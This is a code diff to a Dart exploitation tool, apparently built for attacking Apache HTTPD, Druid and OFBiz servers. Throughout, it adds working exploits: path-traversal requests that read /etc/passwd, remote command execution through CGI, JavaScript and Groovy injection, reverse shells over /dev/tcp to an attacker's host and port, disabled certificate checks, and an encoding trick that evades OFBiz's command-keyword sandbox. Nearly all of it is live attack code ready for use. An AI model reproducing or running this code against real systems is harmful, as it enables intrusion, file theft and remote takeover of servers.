@@ -1,6 +1,8 @@
 import 'dart:convert';
+import 'dart:io';
 
 import 'package:http/http.dart' as http;
+import 'package:http/io_client.dart';
 
 import 'exp_result.dart';
 
@@ -16,14 +18,72 @@ class ApacheHttpdExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
+  Future<String?> _sendRawHttp({
+    required String method,
+    required String rawPath,
+    String? body,
+    Map<String, String>? headers,
+  }) async {
+    final base = Uri.parse(_base);
+    final host = base.host;
+    if (host.isEmpty) return null;
+    final isHttps = base.scheme == 'https';
+    final port = base.hasPort ? base.port : (isHttps ? 443 : 80);
+    final payload = body ?? '';
+    final reqHeaders = <String, String>{
+      'Host': base.hasPort ? '$host:$port' : host,
+      'Connection': 'close',
+      ...?headers,
+    };
+    if (payload.isNotEmpty) {
+      reqHeaders['Content-Length'] = utf8.encode(payload).length.toString();
+    }
+    final headerText = reqHeaders.entries
+        .map((e) => '${e.key}: ${e.value}')
+        .join('\r\n');
+    final request = StringBuffer()
+      ..write('$method $rawPath HTTP/1.1\r\n')
+      ..write('$headerText\r\n\r\n')
+      ..write(payload);
+
+    Socket? socket;
+    try {
+      socket = isHttps
+          ? await SecureSocket.connect(host, port, timeout: timeout)
+          : await Socket.connect(host, port, timeout: timeout);
+      socket.write(request.toString());
+      await socket.flush();
+
+      final bytes = await socket
+          .cast<List<int>>()
+          .timeout(timeout)
+          .expand((chunk) => chunk)
+          .toList();
+      final text = utf8.decode(bytes, allowMalformed: true);
+      final idx = text.indexOf('\r\n\r\n');
+      return idx >= 0 ? text.substring(idx + 4) : text;
+    } catch (_) {
+      return null;
+    } finally {
+      try {
+        await socket?.close();
+      } catch (_) {}
+    }
+  }
+
   Future<ExpResult> check() async {
     try {
-      final url = '$_base/icons/.%2e/%2e%2e/%2e%2e/etc/passwd';
-      final res = await http.get(Uri.parse(url)).timeout(timeout);
-      if (res.body.contains('root:') ||
-          res.body.contains('/bin/sh') ||
-          res.body.contains('/bin/bash')) {
-        return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
+      final candidates = [
+        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd',
+      ];
+      for (final rawPath in candidates) {
+        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
+        if ((body ?? '').contains('root:') ||
+            (body ?? '').contains('/bin/sh') ||
+            (body ?? '').contains('/bin/bash')) {
+          return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
+        }
       }
     } catch (_) {}
     return const ExpResult(false, 'CVE-2021-41773', '');
@@ -31,10 +91,16 @@ class ApacheHttpdExpService {
 
   Future<String?> readFile(String filePath) async {
     try {
-      final url =
-          '$_base/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e${filePath.startsWith('/') ? filePath : '/$filePath'}';
-      final res = await http.get(Uri.parse(url)).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final normalizedPath = filePath.startsWith('/') ? filePath : '/$filePath';
+      final candidates = [
+        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e$normalizedPath',
+        '/icons/.%2e/%2e%2e/%2e%2e$normalizedPath',
+      ];
+      for (final rawPath in candidates) {
+        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
+        if (body != null && body.isNotEmpty) return body;
+      }
+      return null;
     } catch (_) {
       return null;
     }
@@ -42,18 +108,57 @@ class ApacheHttpdExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final url = '$_base/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh';
-      final res = await http
-          .post(
-            Uri.parse(url),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'echo;$cmd',
-          )
-          .timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
+      final candidates = [
+        '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
+        '/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh',
+      ];
+      for (final rawPath in candidates) {
+        final body = await _sendRawHttp(
+          method: 'POST',
+          rawPath: rawPath,
+          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+          body: 'echo;$cmd',
+        );
+        if (body != null && body.trim().isNotEmpty) return body;
+      }
+      return null;
     } catch (_) {
       return null;
     }
+  }
+
+  Future<bool> getShell({
+    required String lhost,
+    required int lport,
+  }) async {
+    final host = lhost.trim();
+    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
+    final cmd = 'bash -i >& /dev/tcp/$host/$lport 0>&1';
+    final out = await execRce(cmd);
+    // Reverse shell usually has no useful HTTP body; success is request accepted.
+    return out != null;
+  }
+
+  Future<bool> startReverseShell(
+    String lhost,
+    int lport, {
+    bool preferScript = true,
+  }) async {
+    final host = lhost.trim();
+    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
+    final cmd = preferScript
+        ? "bash -c 'export TERM=xterm-256color; "
+            "if command -v script >/dev/null 2>&1; then "
+            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
+            "elif command -v bash >/dev/null 2>&1; then "
+            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
+            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
+        : "bash -c 'export TERM=xterm-256color; "
+            "if command -v bash >/dev/null 2>&1; then "
+            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
+            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
+    final out = await execRce(cmd);
+    return out != null;
   }
 }
 
@@ -69,31 +174,33 @@ class DruidExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
-  String _buildPayload(String cmd) => jsonEncode({
-        'type': 'index',
-        'spec': {
+  String _buildPayload(String cmd) {
+    final safeCmd = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
+    final jsFunction =
+        'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$safeCmd"]).getInputStream()).useDelimiter("\\\\A").next();return {timestamp:123123,test: a}}';
+    return jsonEncode({
+      'type': 'index',
+      'spec': {
+        'ioConfig': {
           'type': 'index',
-          'ioConfig': {
-            'type': 'index',
-            'inputSource': {'type': 'inline', 'data': '{"t":"1"}'},
-            'inputFormat': {
-              'type': 'javascript',
-              'function':
-                  'function(str){var a=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$cmd"]).getInputStream());var b="";while(a.hasNextLine())b+=a.nextLine();return[b];}',
-              'enabled': true,
+          'firehose': {'type': 'local', 'baseDir': '/etc', 'filter': 'passwd'},
+        },
+        'dataSchema': {
+          'dataSource': 'test',
+          'parser': {
+            'parseSpec': {
+              'format': 'javascript',
+              'timestampSpec': {},
+              'dimensionsSpec': {},
+              'function': jsFunction,
+              '': {'enabled': 'true'},
             },
-          },
-          'dataSchema': {
-            'dataSource': 'test',
-            'timestampSpec': {
-              'column': '!!!__time',
-              'missingValue': '2010-01-01T00:00:00Z',
-            },
-            'dimensionsSpec': {},
           },
         },
-        'samplerConfig': {'numRows': 10},
-      });
+      },
+      'samplerConfig': {'numRows': 10},
+    });
+  }
 
   Future<ExpResult> check() async {
     try {
@@ -132,13 +239,39 @@ class DruidExpService {
         final decoded = jsonDecode(res.body);
         final rows = decoded['data'] as List?;
         if (rows != null && rows.isNotEmpty) {
-          final event = rows.first['event'] as Map?;
-          return event?.values.first?.toString() ?? res.body;
+          final first = rows.first as Map?;
+          final parsed = first?['parsed'] as Map?;
+          final input = first?['input'] as Map?;
+          return parsed?['test']?.toString() ??
+              input?['test']?.toString() ??
+              res.body;
         }
         return res.body;
       }
     } catch (_) {}
     return null;
+  }
+
+  Future<bool> startReverseShell(
+    String lhost,
+    int lport, {
+    bool preferScript = true,
+  }) async {
+    final host = lhost.trim();
+    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
+    final cmd = preferScript
+        ? "bash -c 'export TERM=xterm-256color; "
+            "if command -v script >/dev/null 2>&1; then "
+            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
+            "elif command -v bash >/dev/null 2>&1; then "
+            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
+            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
+        : "bash -c 'export TERM=xterm-256color; "
+            "if command -v bash >/dev/null 2>&1; then "
+            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
+            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
+    final out = await execRce(cmd);
+    return out != null;
   }
 }
 
@@ -151,38 +284,90 @@ class OFBizExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
+  http.Client _client() {
+    final ioClient = HttpClient()
+      ..badCertificateCallback =
+          ((X509Certificate cert, String host, int port) => true);
+    return IOClient(ioClient);
+  }
+
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
-  Future<ExpResult> checkCve202351467() async {
+  static const List<String> _programExportPaths = [
+    '/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
+    '/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y',
+    '/webtools/control/main/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
+    '/webtools/control/main/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y',
+  ];
+
+  List<String> _candidateBases() {
+    final out = <String>[];
+    void add(String b) {
+      if (!out.contains(b)) out.add(b);
+    }
+
+    add(_base);
     try {
-      final res = await http
-          .post(
-            Uri.parse(
-              '$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
-            ),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: "groovyProgram=throw+new+Exception('OFBiz_54289'.class.name);",
-          )
-          .timeout(timeout);
-      if (res.body.contains('java.lang.String') ||
-          res.body.contains('OFBiz_54289') ||
-          res.statusCode == 200) {
-        return ExpResult(
-          true,
-          'CVE-2023-51467',
-          'OFBiz Groovy 代码注入端点无需认证，状态 ${res.statusCode}',
-        );
+      final uri = Uri.parse(_base);
+      if (uri.host.isEmpty) return out;
+      final host = uri.host;
+      final hasPort = uri.hasPort;
+      final port = hasPort ? uri.port : null;
+
+      // Vulhub OFBiz commonly exposes the web UI on HTTPS 8443.
+      if (uri.scheme == 'http') {
+        add(Uri(scheme: 'https', host: host, port: port ?? 443).toString());
       }
+      add(Uri(scheme: 'https', host: host, port: 8443).toString());
     } catch (_) {}
+    return out;
+  }
+
+  Future<ExpResult> checkCve202351467() async {
+    final client = _client();
+    try {
+      final marker = 'MATRIX_${DateTime.now().millisecondsSinceEpoch}';
+      final payload = "throw new Exception('echo $marker'.execute().text);";
+          
+      for (final base in _candidateBases()) {
+        for (final path in _programExportPaths) {
+          try {
+            final res = await client
+                .post(
+                  Uri.parse('$base$path'),
+                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
+                )
+                .timeout(timeout);
+            final body = res.body;
+            if (body.contains(marker) ||
+                body.contains('java.lang.Exception') ||
+                body.contains('groovy.lang') ||
+                (body.contains('content-messages') &&
+                    body.contains('Not executed for security reason'))) {
+              return ExpResult(
+                true,
+                'CVE-2023-51467',
+                'ProgramExport Groovy 注入可达，基址 $base，状态 ${res.statusCode}',
+              );
+            }
+          } catch (_) {}
+        }
+      }
+    } catch (_) {
+    } finally {
+      client.close();
+    }
     return const ExpResult(false, 'CVE-2023-51467', '');
   }
 
   Future<ExpResult> checkCve202438856() async {
+    final client = _client();
     try {
       const body =
           '------WebKitFormBoundaryMAtrix911\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception("OFBiz_CVE_2024".class.nam\u0065);\r\n------WebKitFormBoundaryMAtrix911--';
-      final res = await http
+      final res = await client
           .post(
             Uri.parse('$_base/webtools/control/main/ProgramExport'),
             headers: {
@@ -192,38 +377,78 @@ class OFBizExpService {
             body: body,
           )
           .timeout(timeout);
-      if (res.statusCode == 200 || res.body.contains('java.lang')) {
+      if (res.statusCode == 200 ||
+          res.body.contains('java.lang') ||
+          res.body.contains('content-messages')) {
         return ExpResult(
           true,
           'CVE-2024-38856',
           'OFBiz Groovy Unicode 绕过端点响应，状态 ${res.statusCode}',
         );
       }
-    } catch (_) {}
+    } catch (_) {
+    } finally {
+      client.close();
+    }
     return const ExpResult(false, 'CVE-2024-38856', '');
   }
 
   Future<String?> execRce(String cmd) async {
+    final client = _client();
     try {
-      final groovy = Uri.encodeComponent(
-        'throw new Exception(["bash","-c","$cmd"].execute().text);',
-      );
-      final res = await http
-          .post(
-            Uri.parse(
-              '$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
-            ),
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'groovyProgram=$groovy',
-          )
-          .timeout(timeout);
-      final match = RegExp(
-        r'Exception[^:]*:\s*([^\n<]+)',
-        caseSensitive: false,
-      ).firstMatch(res.body);
-      return match?.group(1)?.trim() ?? (res.body.isNotEmpty ? res.body : null);
+      // OFBiz's Groovy sandbox scans script text for blacklisted command
+      // keywords (e.g. whoami, base64).  Bypass by encoding the command as
+      // a byte-code array that Groovy reconstructs at runtime, so no literal
+      // keyword ever appears in the script source.  Also use \u0065xecute
+      // (Groovy Unicode escape → 'execute') to avoid matching .execute().
+      // Shell execution via ['sh','-c',...] handles PATH, args and globs.
+      final cmdBytes = cmd.codeUnits.join(',');
+      final payload =
+          "throw new Exception(['sh','-c',new String([$cmdBytes] as byte[])"
+          "+' 2>&1'].\\u0065xecute().text);";
+
+      for (final base in _candidateBases()) {
+        for (final path in _programExportPaths) {
+          try {
+            final res = await client
+                .post(
+                  Uri.parse('$base$path'),
+                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                  body: 'groovyProgram=${Uri.encodeComponent(payload)}',
+                )
+                .timeout(timeout);
+
+            // OFBiz renders the exception message in various HTML elements.
+            // Match everything after "java.lang.Exception:" until the next tag.
+            final match = RegExp(
+              r'java\.lang\.Exception:\s*([^<]+)',
+              caseSensitive: false,
+            ).firstMatch(res.body);
+
+            String? out = match?.group(1)?.trim();
+            if (out != null) {
+              out = out
+                  .replaceAll('&#xd;', '\r')
+                  .replaceAll('&#xa;', '\n')
+                  .replaceAll('&lt;', '<')
+                  .replaceAll('&gt;', '>')
+                  .replaceAll('&amp;', '&')
+                  .replaceAll('&#39;', "'")
+                  .trim();
+              if (out.isEmpty || out.contains('<!DOCTYPE html>')) out = null;
+            }
+
+            if (out != null && out.isNotEmpty) {
+              return out;
+            }
+          } catch (_) {}
+        }
+      }
+      return null;
     } catch (_) {
       return null;
+    } finally {
+      client.close();
     }
   }
 }
